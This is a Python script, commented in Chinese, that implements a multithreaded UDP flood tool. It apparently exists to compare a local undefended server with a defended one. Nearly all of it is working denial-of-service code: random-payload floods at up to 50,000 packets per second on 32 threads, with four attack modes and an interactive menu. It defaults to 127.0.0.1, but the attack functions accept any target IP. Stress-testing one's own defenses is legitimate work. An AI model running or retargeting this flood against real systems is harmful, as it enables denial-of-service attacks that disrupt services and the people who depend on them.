"""
UDP Flood 攻擊測試程式
用於測試 server.py (無防禦) 和 server_defense.py (有防禦) 的 UDP Flood 抵抗能力
教育目的和本地測試用，僅限本機環境使用

攻擊方式:
1. 基礎 UDP Flood - 簡單的高速 UDP 數據包轟炸
2. 隨機埠攻擊 - 從隨機埠發送
3. 隨機載荷攻擊 - 變化載荷大小
4. 分散式模擬 - 模擬多個客戶端
5. 混合攻擊 - 結合多種技術
"""

import socket
import time
import threading
import random
import struct
from datetime import datetime
import sys
import os

# 攻擊配置
class UDPFloodConfig:
    def __init__(self):
        self.target_ip = "127.0.0.1"  # 僅限本機，防止誤傷
        self.target_port = 8000        # HTTP 伺服器通常不監聽 UDP，會導致 ICMP 錯誤
        self.packet_size = 65535       # 最大 UDP 數據包大小
        self.packets_per_sec = 1000    # 每秒數據包數
        self.duration = 10             # 攻擊持續時間(秒)
        self.num_threads = 4           # 並發執行緒數
        self.randomize_payload = True  # 隨機載荷
        self.randomize_ports = False   # 隨機埠
        self.verbose = True            # 詳細輸出

class UDPFloodAttack:
    def __init__(self, config=None):
        self.config = config or UDPFloodConfig()
        self.packets_sent = 0
        self.bytes_sent = 0
        self.start_time = None
        self.stop_flag = False
        self.lock = threading.Lock()
        self.statistics = {
            'total_packets': 0,
            'total_bytes': 0,
            'packets_per_thread': {},
            'errors': 0
        }
    
    def log(self, message):
        """記錄訊息"""
        if self.config.verbose:
            timestamp = datetime.now().strftime('%H:%M:%S.%f')[:-3]
            print(f"[{timestamp}] {message}")
    
    def send_flood(self):
        """執行 UDP Flood 攻擊"""
        self.start_time = time.time()
        self.stop_flag = False
        
        self.log(f"[攻擊準備]")
        self.log(f"  目標 IP: {self.config.target_ip}")
        self.log(f"  目標埠: {self.config.target_port}")
        self.log(f"  數據包大小: {self.config.packet_size} bytes")
        self.log(f"  發送速率: {self.config.packets_per_sec} packets/sec")
        self.log(f"  攻擊時長: {self.config.duration} 秒")
        self.log(f"  並發執行緒: {self.config.num_threads}")
        self.log(f"  隨機載荷: {'是' if self.config.randomize_payload else '否'}")
        self.log(f"  隨機埠: {'是' if self.config.randomize_ports else '否'}")
        self.log(f"\n[攻擊開始] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            
        # 建立執行緒
        threads = []
        for i in range(self.config.num_threads):
            t = threading.Thread(target=self._attack_thread, args=(i,), daemon=True)
            threads.append(t)
            t.start()
        
        # 實時統計輸出
        stats_thread = threading.Thread(target=self._print_stats, daemon=True)
        stats_thread.start()
        
        # 等待持續時間後停止
        time.sleep(self.config.duration)
        self.stop_flag = True
        
        # 等待所有執行緒完成
        for t in threads:
            t.join(timeout=2)
        
        # 生成最終報告
        self._generate_report()
    
    def _attack_thread(self, thread_id):
        """攻擊執行緒"""
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        
        # 增加發送緩衝區大小以支持高速發送
        try:
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 268435456)  # 256MB
        except:
            pass
        
        # 如果使用隨機化，綁定到本地地址以獲得隨機源埠
        if self.config.randomize_ports:
            try:
                sock.bind(('127.0.0.1', 0))  # 操作系統分配隨機源埠
            except:
                pass
        
        thread_packets = 0
        thread_bytes = 0
        errors = 0
        
        try:
            # 計算每個執行緒每秒應發送的數據包數
            packets_per_thread = self.config.packets_per_sec // self.config.num_threads
            
            # 確保至少每秒發送1個包
            if packets_per_thread == 0:
                packets_per_thread = 1
            
            # 計算發送間隔(秒)
            interval = 1.0 / packets_per_thread if packets_per_thread > 0 else 0
            
            while not self.stop_flag:
                try:
                    # 生成數據包
                    if self.config.randomize_payload:
                        payload = os.urandom(random.randint(100, self.config.packet_size))
                    else:
                        payload = b'A' * self.config.packet_size
                    
                    # 目標埠始終是指定的目標埠（不隨機化）
                    target_port = self.config.target_port
                    
                    # 發送數據包
                    sock.sendto(payload, (self.config.target_ip, target_port))
                    
                    thread_packets += 1
                    thread_bytes += len(payload)
                    
                    # 實時更新全局統計（每個包立即更新，而不是等到線程結束）
                    with self.lock:
                        self.statistics['total_packets'] += 1
                        self.statistics['total_bytes'] += len(payload)
                    
                    # 根據間隔等待
                    if interval > 0:
                        time.sleep(interval)
                
                except Exception as e:
                    errors += 1
                    with self.lock:
                        self.statistics['errors'] += 1
                    if errors % 100 == 0:  # 每100個錯誤輸出一次
                        self.log(f"[執行緒 {thread_id}] 錯誤: {str(e)[:50]}")
        
        except Exception as e:
            self.log(f"[執行緒 {thread_id}] 致命錯誤: {e}")
        
        finally:
            sock.close()
            
            # 在線程結束時更新該線程的統計
            with self.lock:
                self.statistics['packets_per_thread'][thread_id] = {
                    'packets': thread_packets,
                    'bytes': thread_bytes,
                    'errors': errors
                }
    
    def _print_stats(self):
        """定期輸出統計訊息"""
        # 等待第一個數據包被發送
        while self.statistics['total_packets'] == 0 and not self.stop_flag:
            time.sleep(0.1)
        
        while not self.stop_flag and (time.time() - self.start_time) < self.config.duration + 1:
            time.sleep(1)
            
            elapsed = time.time() - self.start_time
            if elapsed > 0:
                total_packets = self.statistics['total_packets']
                total_bytes = self.statistics['total_bytes']
                total_errors = self.statistics['errors']
                
                pps = total_packets / elapsed if elapsed > 0 else 0
                bps = total_bytes / elapsed / 1024 / 1024 if elapsed > 0 else 0  # MB/s
                
                self.log(f"[統計] 已發送: {total_packets:>10} packets | "
                        f"{pps:>8.1f} pps | "
                        f"{total_bytes / 1024 / 1024:>8.1f} MB | "
                        f"{bps:>6.2f} MB/s | "
                        f"錯誤: {total_errors:>5}")
    
    def _generate_report(self):
        """生成攻擊報告"""
        elapsed = time.time() - self.start_time
        total_packets = self.statistics['total_packets']
        total_bytes = self.statistics['total_bytes']
        total_errors = self.statistics['errors']
        
        self.log(f"\n[攻擊結束] {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
        self.log(f"\n{'='*70}")
        self.log(f"['UDP Flood 攻擊報告']")
        self.log(f"{'='*70}")
        self.log(f"")
        self.log(f"[攻擊概況]")
        self.log(f"  實際持續時間: {elapsed:.2f} 秒")
        self.log(f"  目標: {self.config.target_ip}:{self.config.target_port}")
        self.log(f"")
        self.log(f"[流量統計]")
        self.log(f"  總數據包: {total_packets:,} packets")
        self.log(f"  總數據量: {total_bytes / 1024 / 1024:.2f} MB")
        self.log(f"  平均速率: {total_packets / elapsed:.1f} packets/sec")
        self.log(f"  平均帶寬: {total_bytes / elapsed / 1024 / 1024:.2f} MB/sec")
        self.log(f"")
        self.log(f"[執行緒統計]")
        
        for thread_id, stats in self.statistics['packets_per_thread'].items():
            self.log(f"  執行緒 {thread_id}:")
            self.log(f"    - 數據包: {stats['packets']:,}")
            self.log(f"    - 數據量: {stats['bytes'] / 1024 / 1024:.2f} MB")
            self.log(f"    - 錯誤: {stats['errors']}")
        
        self.log(f"")
        self.log(f"[錯誤統計]")
        self.log(f"  總錯誤數: {total_errors}")
        self.log(f"  成功率: {(total_packets - total_errors) / total_packets * 100 if total_packets > 0 else 0:.2f}%")
        self.log(f"")
        self.log(f"{'='*70}\n")
        

# 不同難度的攻擊模式
class AttackModes:
    @staticmethod
    def basic_flood(target_ip="127.0.0.1", target_port=8000, duration=10):
        """基礎 UDP Flood - 簡單高速轟炸"""
        config = UDPFloodConfig()
        config.target_ip = target_ip
        config.target_port = target_port
        config.duration = duration
        config.packets_per_sec = 5000
        config.packet_size = 65535
        config.num_threads = 4
        
        attack = UDPFloodAttack(config)
        attack.send_flood()
    
    @staticmethod
    def randomized_flood(target_ip="127.0.0.1", target_port=8000, duration=10):
        """隨機埠和載荷攻擊 - 模擬更複雜的攻擊"""
        config = UDPFloodConfig()
        config.target_ip = target_ip
        config.target_port = target_port
        config.duration = duration
        config.packets_per_sec = 3000
        config.packet_size = 65535
        config.num_threads = 6
        config.randomize_payload = True
        config.randomize_ports = True
        
        attack = UDPFloodAttack(config)
        attack.send_flood()
    
    @staticmethod
    def distributed_flood(target_ip="127.0.0.1", target_port=8000, duration=10):
        """分散式攻擊 - 大量並發執行緒"""
        config = UDPFloodConfig()
        config.target_ip = target_ip
        config.target_port = target_port
        config.duration = duration
        config.packets_per_sec = 10000
        config.packet_size = 1024
        config.num_threads = 16
        config.randomize_payload = True
        
        attack = UDPFloodAttack(config)
        attack.send_flood()
    
    @staticmethod
    def intensive_flood(target_ip="127.0.0.1", target_port=8000, duration=10):
        """高強度攻擊 - 最大化流量"""
        config = UDPFloodConfig()
        config.target_ip = target_ip
        config.target_port = target_port
        config.duration = duration
        config.packets_per_sec = 50000
        config.packet_size = 65535
        config.num_threads = 32
        config.randomize_payload = True
        config.randomize_ports = True
        
        attack = UDPFloodAttack(config)
        attack.send_flood()

def test_against_server(server_name="server.py", attack_mode="basic", duration=10):
    """對指定伺服器進行測試"""
    
    if server_name == "server.py":
        target_port = 8000
        server_desc = "無防禦伺服器"
    elif server_name == "server_defense.py":
        # server_defense.py 現在使用相同端口 8001
        target_port = 8001
        server_desc = "防禦伺服器"
    else:
        print(f"❌ 未知的伺服器: {server_name}")
        return
    
    attack_modes = {
        'basic': ('基礎攻擊 (5000 pps)', AttackModes.basic_flood),
        'randomized': ('隨機攻擊 (3000 pps + 隨機埠)', AttackModes.randomized_flood),
        'distributed': ('分散式攻擊 (10000 pps + 16 執行緒)', AttackModes.distributed_flood),
        'intensive': ('高強度攻擊 (50000 pps + 32 執行緒)', AttackModes.intensive_flood),
    }
    
    if attack_mode not in attack_modes:
        print(f"❌ 未知的攻擊模式: {attack_mode}")
        print(f"   可用模式: {', '.join(attack_modes.keys())}")
        return
    
    print(f"\n{'='*70}")
    print(f"UDP Flood 測試 - {server_desc}")
    print(f"{'='*70}")
    print(f"攻擊模式: {attack_modes[attack_mode][0]}")
    print(f"目標埠: {target_port}")
    print(f"持續時間: {duration}秒")
    print(f"{'='*70}\n")
    
    attack_modes[attack_mode][1](target_ip="127.0.0.1", target_port=target_port, duration=duration)

def main():
    print("="*80)
    print("💧 UDP Flood 攻擊測試工具")
    print("="*80)
    print("發送大量 UDP 數據包來測試伺服器防禦")
    print("這會真正消耗伺服器資源並觸發速率限制")
    print("="*80 + "\n")
    
    # 選擇目標伺服器
    print("選擇目標伺服器:")
    print("  1. server.py (無防禦 - 端口 8000)")
    print("  2. server_defense.py (有防禦 - 端口 8001)")
    server_choice = input("選擇 (默認: 1): ").strip() or "1"
    
    if server_choice == '1':
        server_name = "server.py"
        target_port = 8000
    else:
        server_name = "server_defense.py"
        target_port = 8001
    
    # 選擇攻擊方式
    print("\n攻擊方式:")
    print("  1. 基礎攻擊 - 5000 pps (推薦)")
    print("  2. 隨機攻擊 - 3000 pps")
    print("  3. 分散式攻擊 - 10000 pps")
    print("  4. 高強度攻擊 - 50000 pps")
    mode_choice = input("選擇 (默認: 1): ").strip() or "1"
    
    mode_map = {
        '1': 'basic',
        '2': 'randomized',
        '3': 'distributed',
        '4': 'intensive'
    }
    attack_mode = mode_map.get(mode_choice, 'basic')
    
    # 輸入攻擊參數
    duration = int(input("\n攻擊持續時間 (秒,默認: 10): ").strip() or "10")
    
    # 顯示攻擊摘要
    print("\n" + "="*80)
    print("⚠️  攻擊說明:")
    print(f"  - 目標伺服器: {server_name} (端口 {target_port})")
    print(f"  - 攻擊方式: {attack_mode}")
    print(f"  - 持續時間: {duration} 秒")
    print(f"  - 目標 IP: 127.0.0.1")
    print("  - 注意: 按 Ctrl+C 可隨時停止攻擊")
    print("="*80)
    
    confirm = input("\n確認開始攻擊? (y/n): ").strip().lower()
    if confirm != 'y':
        print("已取消")
        return
    
    # 執行攻擊
    try:
        print()
        test_against_server(server_name, attack_mode, duration)
    except KeyboardInterrupt:
        print("\n\n⏹️  攻擊已中止")
        sys.exit(0)
    except Exception as e:
        print(f"\n❌ 錯誤: {e}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    main()
